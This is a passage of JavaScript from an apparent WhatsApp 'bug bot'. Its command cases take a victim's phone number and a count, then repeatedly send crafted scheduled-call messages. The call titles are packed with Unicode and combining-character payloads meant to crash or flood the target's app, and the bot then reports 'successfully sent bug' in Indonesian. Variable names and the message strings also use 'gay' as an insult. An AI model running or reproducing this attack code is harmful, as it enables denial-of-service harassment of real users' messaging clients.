await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘgay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘgay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ 😈̸̦̣͛͘ ᚘ𝐮᚛𝐀𝐫𝐞᪣𝐀ᚘ𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
}
zetsreply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
case '🍍' : case '🍊' : case '🍑' : case '🍉' : case '🍎' : case '🍒' : case '🍓' : case '🍄' : case '🏵' : case '🌻' : {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
Pe = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
attention = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(bnnd, schedule.message, { messageId: schedule.key.id })
	}
for (let i = 0; i < jumlah; i++) {
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐒⸙𝐀࿈𝐌 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
